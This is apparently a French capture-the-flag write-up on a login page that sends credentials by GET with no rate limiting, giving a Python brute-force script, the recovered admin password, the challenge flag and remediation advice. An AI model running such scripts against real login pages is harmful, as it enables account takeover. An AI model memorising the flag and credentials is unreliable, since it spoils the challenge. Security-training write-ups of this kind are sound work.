# Le Login - Vulnérabilité de Brute Force

## Description de la faille
La page de login présente deux champs : `username` et `password`. En observant le comportement du formulaire, on remarque que les données sont transmises via une requête **HTTP GET**. 

L'URL générée ressemble à ceci :
`http://192.168.56.101/?page=signin&username=<USERNAME>&password=<PASSWORD>&Login=Login#`

L'absence de mécanisme de protection contre les tentatives répétées (comme un verrouillage de compte, un captcha ou un ralentissement des requêtes/Rate Limiting) rend cette page vulnérable à une attaque de type **Brute Force**.

## Théorie : L'attaque par Brute Force
Le Brute Force consiste à tester systématiquement une liste de combinaisons d'identifiants jusqu'à trouver la bonne. 

Pour ce challenge, nous partons du principe que l'utilisateur est `admin`. Il nous faut donc :
1. Une liste de mots de passe (Wordlist), comme celles trouvées sur [SecLists](https://github.com/danielmiessler/SecLists).
2. Un script pour automatiser les requêtes.
3. Un critère de réussite : ici, nous cherchons une réponse qui ne contient pas le message d'erreur `"Wrong"`.

> **Note :** Contrairement à une API moderne, le serveur renvoie un code statut `200 OK` même en cas d'échec. L'analyse doit donc se porter sur le corps de la réponse HTML.



## Script d'exploitation (Python)
Ce script utilise la bibliothèque `requests` pour automatiser les tentatives de connexion.

```python
import requests

# Configuration
ip = "localhost"
port = "8080"
url = f"http://{ip}:{port}/" 
password_file = "passwords.txt"
username = "admin"
session = requests.Session()

def brute_force():
    try:
        with open(password_file, 'r') as file:
            for line in file:
                password = line.strip()
                params = {
                    'page': 'signin',
                    'username': username,
                    'password': password,
                    'Login': 'Login'
                }
                # Envoi de la requête GET
                response = session.get(url, params=params, timeout=5)
                
                # Si le message "Wrong" est absent, on a probablement trouvé le mot de passe
                if "Wrong" not in response.text:
                    print(f"\n[SUCCESS] Username: {username} | Password: {password}")
                    return
                else:
                    print(f"[-] Test: {password}", end="\r")
    except FileNotFoundError:
        print("Fichier de mots de passe introuvable.")

if __name__ == "__main__":
    brute_force()
```

## Solution

Après avoir lancé le script avec une wordlist standard, nous trouvons les identifiants suivants :

- Username : admin
- Password : shadow

En se connectant avec ces accès, le flag est révélé.

## Flag
`b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2`

## Potentiel remédiation
- Implémenter un Rate Limiting : Limiter le nombre de requêtes par IP via le serveur Web (Nginx/Apache) ou directement dans le code applicatif.

    ```php
    // Exemple conceptuel en PHP
    $attempts = getAttemptsFromDatabase($_SERVER['REMOTE_ADDR']);

    if ($attempts >= 5) {
        header('HTTP/1.1 429 Too Many Requests');
        die("Trop de tentatives. Réessayez dans 15 minutes.");
    }

    if (!checkLogin($_POST['user'], $_POST['pass'])) {
        incrementAttemptsInDatabase($_SERVER['REMOTE_ADDR']);
        echo "Identifiants incorrects.";
    }
    ```

- Utiliser des Captchas : Pour différencier les scripts automatisés des utilisateurs réels.

- Politique de mots de passe forts : Forcer l'utilisation de mots de passe complexes pour rendre le brute force inutile.

- Authentification à deux facteurs (2FA) : Même si le mot de passe est trouvé, l'attaquant ne peut pas se connecter sans le deuxième facteur.
